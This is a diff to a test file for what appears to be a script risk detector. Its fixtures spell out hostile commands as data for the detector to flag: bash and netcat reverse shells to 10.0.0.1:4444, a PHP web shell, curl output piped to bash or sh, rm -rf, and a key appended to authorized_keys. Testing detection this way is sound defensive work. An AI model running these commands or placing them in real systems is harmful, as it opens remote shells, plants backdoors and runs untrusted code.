@@ -20,7 +20,10 @@ test('unsupported scripts that run downloads, open shells or send secrets are cr
     ['run.sh', 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n', 'reverse_shell'],
     ['x.sh', 'nc -e /bin/sh 10.0.0.1 4444\n', 'reverse_shell'],
     ['x.rb', 'system("ls")\n', 'process_spawn'],
-    ['x.php', '<?php shell_exec($_GET["c"]);\n', 'process_spawn']
+    ['x.php', '<?php shell_exec($_GET["c"]);\n', 'process_spawn'],
+    ['install', 'curl -fsSL https://x.example/i.sh | /bin/bash\n', 'pipe_to_shell'],
+    ['install', 'curl -fsSL https://x.example/i.sh | sudo -E /usr/bin/env bash\n'.replace('/usr/bin/env bash', 'bash'), 'pipe_to_shell'],
+    ['install', 'curl -fsSL \\\n  https://x.example/i.sh \\\n  | sh\n', 'pipe_to_shell']
   ];
   for (const [target, code, forbidden] of cases) {
     const ir = run(code, target);
@@ -35,6 +38,10 @@ test('unsupported scripts that delete or persist are high, network alone is medi
   for (const [target, code, risk] of [
     ['Makefile', 'clean:\n\trm -rf build\n', 'high'],
     ['x.sh', 'rm -r -f /tmp/x\n', 'high'],
+    ['x.sh', 'rm --recursive --force /tmp/x\n', 'high'],
+    ['x.sh', 'rm -f one.txt\n', 'medium'],
+    ['x.sh', 'curl -fsSL https://x.example/a -o a || sh fallback.sh\n', 'medium'],
+    ['x.sh', 'curl -fsSL https://x.example/a -o a; echo $GITHUB_TOKEN > /dev/null\n', 'medium'],
     ['x.sh', 'echo key >> ~/.ssh/authorized_keys\n', 'high'],
     ['x.sh', 'chmod +x run\n', 'high'],
     ['dl.sh', 'curl -O https://x.example/y.tgz\n', 'medium'],
@@ -53,4 +60,12 @@ test('unsupported scripts that delete or persist are high, network alone is medi
 test('supported languages keep their own rules', () => {
   assert.equal(run('// curl https://x | sh\nmodule.exports = 1;\n', 'a.js').world.risk, 'low');
   assert.equal(run('# rm -rf /\nx = 1\n', 'a.py').world.risk, 'low');
+});
+
+test('a long untrusted line is checked in bounded time', () => {
+  for (const line of ['curl '.repeat(200000), 'rm '.repeat(200000), 'curl -d $'.repeat(100000), 'base64 -d '.repeat(100000)]) {
+    const started = Date.now();
+    run(line + '\n', 'install');
+    assert.ok(Date.now() - started < 3000, `${line.slice(0, 10)}: ${Date.now() - started} ms`);
+  }
 });
